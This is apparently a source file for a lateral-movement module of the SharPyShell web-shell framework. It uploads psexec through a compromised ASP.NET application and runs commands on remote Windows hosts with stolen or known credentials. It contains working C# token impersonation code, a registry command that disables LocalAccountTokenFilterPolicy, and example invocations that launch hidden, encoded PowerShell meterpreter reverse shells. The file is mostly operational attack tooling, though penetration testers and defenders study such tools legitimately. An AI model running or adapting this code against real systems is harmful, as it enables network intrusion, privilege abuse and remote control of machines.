from core import config
from core.Module import Module, ModuleException
from modules.upload import Upload
from utils.random_string import random_generator
import traceback


class LateralPsexecModuleException(ModuleException):
    pass


class Lateral_psexec(Module):
    _exception_class = LateralPsexecModuleException
    short_help = "Run psexec binary to move laterally"
    complete_help = r"""
        This module upload and run the psexec binary in order to launch commands on a remote windows system.
        This will result in a lateral movement if shared credentials are known.
        
        Note that if you use local users credentials you should ensure that, on the target server, the feature
        "LocalAccountTokenFilterPolicy" is disabled.
        To disable that you need to add the following regkey with the value of 1:
        
        HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system\LocalAccountTokenFilterPolicy
        
        example command:
            reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
        
        If you use domain users for the lateral movement, no restrictions to the process token will be applied.
        
        This module should be run from a privileged user.
        If the application pool within the web application you are interacting with is run with application pool
        identity account or any limited account you won't be able to move laterally to other systems
        due to restrictions applied to the user.
        In those cases, you need to use different credentials of a more privileged user in order to launch this module.
                       
        Usage:
            #lateral_psexec target_ip username password command [runas_system] [local_user] [local_password] [local_domain]
        
        Positional arguments:
            target_ip               the ip of the remote server
            username                username of the user to use to login on the target server 
                                    you can specify domain\username if user is in a domain
            password                password of the user to use to login on the target server
            command                 a command compatible by cmd.exe
            [runas_system]          if set to 'true', it will try to run psexec as system on the target remote server
                                    Default: 'false'
            [local_user]            the username of a local user with privileged rights
            [local_password]        the password of a local user with privileged rights
            [local_domain]          the domain of a local user with privileged rights
                                        
        Examples:
            Lateral movement as privileged current application pool user, output to local shared resource:
                 #lateral_psexec 192.168.56.102 'remote_user1' 'remote_password1' 'whoami /priv > \\192.168.56.101\everyone\output.txt' 
            Lateral movement as privileged local user using meterpreter http reverse shell (format psh-cmd):
                 #lateral_psexec 192.168.56.102 'remote_user1' 'remote_password1' '%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -e aQBmA.......HMAKQA7AA==' 'false' 'local_privileged_user1' 'local_privileged_password1'
            Lateral movement as privileged domain user using meterpreter http reverse shell (format psh-cmd):
                 #lateral_psexec 192.168.56.102 'remote_user1' 'remote_password1' '%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -e aQBmA.......HMAKQA7AA==' 'false' 'domain_privileged_user1' 'domain_privileged_password1' 'domain_1'
            Lateral movement as privileged domain user and as SYSTEM on remote machine using meterpreter http reverse shell (format psh-cmd):
                 #lateral_psexec 192.168.56.102 'remote_user1' 'remote_password1' '%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -e aQBmA.......HMAKQA7AA==' 'true' 'domain_privileged_user1' 'domain_privileged_password1' 'domain_1'

    """

    _runtime_code = ur"""
                    using System;using System.IO;using System.Diagnostics;using System.Text;
                    public class SharPyShell
                    {                    
                        string LateralPsexec(string psexec_path, string arg, string working_path)
                        {
                            ProcessStartInfo pinfo = new ProcessStartInfo();
                            pinfo.FileName = psexec_path;
                            pinfo.Arguments = arg;
                            pinfo.RedirectStandardOutput = true;
                            pinfo.RedirectStandardError = true;
                            pinfo.UseShellExecute = false;
                            pinfo.WorkingDirectory = working_path;
                            Process p = new Process();
                            try{
                                p = Process.Start(pinfo);
                            }
                            catch (Exception e){
                                return "{{{SharPyShellError}}}\n" + e;
                            }
                            StreamReader stmrdr_output = p.StandardOutput;
                            StreamReader stmrdr_errors = p.StandardError;
                            string output = "";
                            string stand_out = stmrdr_output.ReadToEnd();
                            string stand_errors = stmrdr_errors.ReadToEnd();
                            stmrdr_output.Close();
                            stmrdr_errors.Close();
                            if (!String.IsNullOrEmpty(stand_out))
                                output = output + stand_out;
                            if (!String.IsNullOrEmpty(stand_errors))
                                output = output + "\n\n" + stand_errors + "\n";
                            return output;
                        }

                        public byte[] ExecRuntime()
                        {
                            string output_func=LateralPsexec(@"%s", @"%s", @"%s");
                            byte[] output_func_byte=Encoding.UTF8.GetBytes(output_func);
                            return(output_func_byte);
                        }
                    }
                    """

    _runtime_code_runas = ur"""
                    using System;using System.IO;using System.Diagnostics;using System.Text;
                    using System.Runtime.InteropServices;using System.Security.Principal;using System.Security.Permissions;using System.Security;using Microsoft.Win32.SafeHandles;using System.Runtime.ConstrainedExecution;

                    public class SharPyShell
                    {
                        public sealed class SafeTokenHandle : SafeHandleZeroOrMinusOneIsInvalid
                        {
                            private SafeTokenHandle()
                                : base(true)
                            {
                            }

                            [DllImport("kernel32.dll")]
                            [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
                            [SuppressUnmanagedCodeSecurity]
                            [return: MarshalAs(UnmanagedType.Bool)]
                            private static extern bool CloseHandle(IntPtr handle);

                            protected override bool ReleaseHandle()
                            {
                                return CloseHandle(handle);
                            }
                        }

                        [StructLayout(LayoutKind.Sequential)] public struct STARTUPINFO
                        {
                        public int cb;
                        public String lpReserved;
                        public String lpDesktop;
                        public String lpTitle;
                        public uint dwX;
                        public uint dwY;
                        public uint dwXSize;
                        public uint dwYSize;
                        public uint dwXCountChars;
                        public uint dwYCountChars;
                        public uint dwFillAttribute;
                        public uint dwFlags;
                        public short wShowWindow;
                        public short cbReserved2;
                        public IntPtr lpReserved2;
                        public IntPtr hStdInput;
                        public IntPtr hStdOutput;
                        public IntPtr hStdError;
                        }

                        [StructLayout(LayoutKind.Sequential)] public struct PROCESS_INFORMATION
                        {
                        public IntPtr hProcess;
                        public IntPtr hThread;
                        public uint   dwProcessId;
                        public uint   dwThreadId;
                        }

                        [StructLayout(LayoutKind.Sequential)] public struct SECURITY_ATTRIBUTES
                        {
                        public int    Length;
                        public IntPtr lpSecurityDescriptor;
                        public bool   bInheritHandle;
                        }

                        [DllImport("kernel32.dll", EntryPoint="CloseHandle", SetLastError=true, CharSet=CharSet.Auto, CallingConvention=CallingConvention.StdCall)]
                        public static extern bool CloseHandle(IntPtr handle);

                        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
                        public static extern bool LogonUser(String lpszUsername, String lpszDomain, String lpszPassword, int dwLogonType, int dwLogonProvider, out SafeTokenHandle phToken);

                        [DllImport("advapi32.dll", EntryPoint="CreateProcessAsUser", SetLastError=true, CharSet=CharSet.Ansi, CallingConvention=CallingConvention.StdCall)]
                        public static extern bool CreateProcessAsUser(IntPtr hToken, String lpApplicationName, String lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandle, int dwCreationFlags, IntPtr lpEnvironment, String lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

                        [DllImport("advapi32.dll", EntryPoint="DuplicateTokenEx")]
                        public static extern bool DuplicateTokenEx(IntPtr ExistingTokenHandle, uint dwDesiredAccess, ref SECURITY_ATTRIBUTES lpThreadAttributes, int TokenType, int ImpersonationLevel, ref IntPtr DuplicateTokenHandle);

                        [DllImport("kernel32.dll", SetLastError=true)]
                        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

                        const uint WAIT_ABANDONED = 0x00000080;
                        const uint WAIT_OBJECT_0 = 0x00000000;
                        const uint WAIT_TIMEOUT = 0x00000102;

                        [PermissionSetAttribute(SecurityAction.Demand, Name = "FullTrust")]                    
                        public string LateralPsexecRunas(string psexec_path, string userName, string password, string domainName, string psexec_arguments, string stdout_file, string stderr_file, string working_directory)
                        {
                            SafeTokenHandle safeTokenHandle;
                            int logon_type = 4;
                            uint process_ms_timeout = 60000;
                            string output = "";
                            string error_string = "{{{SharPyShellError}}}";
                            try
                            {
                                const int LOGON32_PROVIDER_DEFAULT = 0;
                                const int LOGON32_PROVIDER_WINNT35 = 1;
                                const int LOGON32_PROVIDER_WINNT40 = 2;
                                const int LOGON32_PROVIDER_WINNT50 = 3;
                                bool returnValue = LogonUser(userName, domainName, password, logon_type, LOGON32_PROVIDER_DEFAULT, out safeTokenHandle);
                                if (false == returnValue)
                                {
                                    output += error_string + "\nWrong Credentials. LogonUser failed with error code : " + Marshal.GetLastWin32Error();
                                    return output;
                                }
                                using (safeTokenHandle)
                                {
                                    using (WindowsIdentity newId = new WindowsIdentity(safeTokenHandle.DangerousGetHandle()))
                                    {
                                        using (WindowsImpersonationContext impersonatedUser = newId.Impersonate())
                                        {
                                            IntPtr Token = new IntPtr(0);
                                            IntPtr DupedToken = new IntPtr(0);
                                            bool      ret;
                                            SECURITY_ATTRIBUTES sa  = new SECURITY_ATTRIBUTES();
                                            sa.bInheritHandle       = false;
                                            sa.Length               = Marshal.SizeOf(sa);
                                            sa.lpSecurityDescriptor = (IntPtr)0;
                                            Token = WindowsIdentity.GetCurrent().Token;
                                            const uint GENERIC_ALL = 0x10000000;
                                            const int SecurityImpersonation = 2;
                                            const int TokenType = 1;
                                            ret = DuplicateTokenEx(Token, GENERIC_ALL, ref sa, SecurityImpersonation, TokenType, ref DupedToken);
                                            if (ret == false){
                                                 output += error_string + "\nDuplicateTokenEx failed with " + Marshal.GetLastWin32Error();
                                                return output;
                                            }
                                            STARTUPINFO si          = new STARTUPINFO();
                                            si.cb                   = Marshal.SizeOf(si);
                                            si.lpDesktop            = "";
                                            string commandLinePath = "";
                                            File.Create(stdout_file).Dispose();
                                            File.Create(stderr_file).Dispose();
                                            string cmd_path = commandLinePath =  Environment.GetEnvironmentVariable("ComSpec");
                                            commandLinePath =  cmd_path + " /c " + psexec_path + " " + psexec_arguments + " >> " + stdout_file + " 2>>" + stderr_file;
                                            PROCESS_INFORMATION pi  = new PROCESS_INFORMATION();
                                            ret = CreateProcessAsUser(DupedToken,null,commandLinePath, ref sa, ref sa, false, 0, (IntPtr)0, working_directory, ref si, out pi);
                                            if (ret == false){
                                                output += error_string + "\nCreateProcessAsUser failed with " + Marshal.GetLastWin32Error();
                                                return output;
                                            }
                                            else{
                                                uint wait_for = WaitForSingleObject(pi.hProcess, process_ms_timeout);
                                                if(wait_for == WAIT_OBJECT_0){
                                                    string errors = File.ReadAllText(stderr_file);
                                                    if (!String.IsNullOrEmpty(errors))
                                                        output += "\n" + errors;
                                                    output += "\n" + File.ReadAllText(stdout_file);
                                                }
                                                else{
                                                    output += error_string + "\nProcess with pid " + pi.dwProcessId + " couldn't end correctly. Error Code: " +  Marshal.GetLastWin32Error();
                                                }
                                                File.Delete(stdout_file);
                                                File.Delete(stderr_file);
                                                CloseHandle(pi.hProcess);
                                                CloseHandle(pi.hThread);
                                            }
                                            CloseHandle(DupedToken);
                                        }
                                    }
                                }
                            }
                            catch (Exception ex)
                            {
                                output += error_string + "\nException occurred. " + ex.Message;
                                return output;
                            }
                        return output;
                        }

                        public byte[] ExecRuntime()
                        {
                            string output_func=LateralPsexecRunas(@"%s", @"%s", @"%s", @"%s", @"%s", @"%s", @"%s", @"%s");
                            byte[] output_func_byte=Encoding.UTF8.GetBytes(output_func);
                            return(output_func_byte);
                        }
                    }
                    """

    __default_runas_system = 'false'
    __default_local_user = ''
    __default_local_password = ''
    __default_local_domain = ''
    __psexec_code_arguments = ur'-accepteula \\%s -u ""%s"" -p ""%s"" %s cmd /c ""%s""'

    def __init__(self, password, channel_enc_mode, module_settings, request_object):
        Module.__init__(self, password, channel_enc_mode, module_settings, request_object)
        self.upload_module_object = Upload(password, channel_enc_mode, module_settings, request_object)

    def __lookup_psexec_binary(self):
        if 'psexec.exe' in self._module_settings.keys():
            bin_path = self._module_settings['psexec.exe']
        else:
            exe_path = config.modules_paths + 'exe_modules/psexec.exe'
            remote_upload_path = self._module_settings['env_directory'] + '\\' + random_generator() + '.exe'
            print '\n\n\nUploading psexec binary....\n'
            upload_response = self._parse_response(self.upload_module_object.run([exe_path, remote_upload_path]))
            print upload_response
            self._module_settings['psexec.exe'] = remote_upload_path
            bin_path = remote_upload_path
        return bin_path

    def __run_as_current_user(self, psexec_path, psexec_code_arguments):
        request = self._create_request([psexec_code_arguments, psexec_path, 'current_user'])
        encrypted_request = self._encrypt_request(request)
        encrypted_response = self._post_request(encrypted_request)
        decrypted_response = self._decrypt_response(encrypted_response)
        return decrypted_response

    def __run_as(self, psexec_path, psexec_code_arguments, local_user, local_password, local_domain):
        request = self._create_request([[psexec_code_arguments, local_user, local_password, local_domain],
                                        psexec_path, 'runas'])
        encrypted_request = self._encrypt_request(request)
        encrypted_response = self._post_request(encrypted_request)
        decrypted_response = self._decrypt_response(encrypted_response)
        return decrypted_response

    def __parse_run_args(self, args):
        if len(args) < 4:
            raise self._exception_class('#lateral_psexec: Not enough arguments. 4 Arguments required.\n')
        args_parser = {k: v for k, v in enumerate(args)}
        target_ip = args_parser.get(0)
        username = args_parser.get(1)
        password = args_parser.get(2)
        command = args_parser.get(3)
        runas_system = args_parser.get(4, self.__default_runas_system)
        local_user = args_parser.get(5, self.__default_local_user)
        local_password = args_parser.get(6, self.__default_local_password)
        local_domain = args_parser.get(7, self.__default_local_domain)
        return target_ip, username, password, command, runas_system, local_user, local_password, local_domain

    def _create_request(self, args):
        arguments, psexec_path, request_type = args
        working_path = self._module_settings['working_directory']
        if request_type == 'runas':
            psexec_code_arguments, local_user, local_password, local_domain = arguments
            stdout_file = self._module_settings['env_directory'] + '\\' + random_generator()
            stderr_file = self._module_settings['env_directory'] + '\\' + random_generator()
            request = self._runtime_code_runas % (psexec_path, local_user, local_password, local_domain,
                                                  psexec_code_arguments, stdout_file, stderr_file, working_path)
        else:
            psexec_code_arguments = arguments
            request = self._runtime_code % (psexec_path, psexec_code_arguments, working_path)
        return request

    def run(self, args):
        try:
            target_ip, username, password, command, runas_system,\
                local_user, local_password, local_domain = self.__parse_run_args(args)
            psexec_priv_flag = '-s' if runas_system == 'true' else '-h'
            psexec_code_arguments = self.__psexec_code_arguments % (target_ip, username,
                                                                 password, psexec_priv_flag, command)
            psexec_path = self.__lookup_psexec_binary()
            if local_user == '':
                response = self.__run_as_current_user(psexec_path, psexec_code_arguments)
            else:
                response = self.__run_as(psexec_path, psexec_code_arguments, local_user, local_password, local_domain)
            parsed_response = self._parse_response(response)
        except ModuleException as module_exc:
            parsed_response = str(module_exc)
        except Exception:
            parsed_response = '{{{' + self._exception_class.__name__ + '}}}' + '{{{PythonError}}}\n' +\
                              str(traceback.format_exc())
        return parsed_response
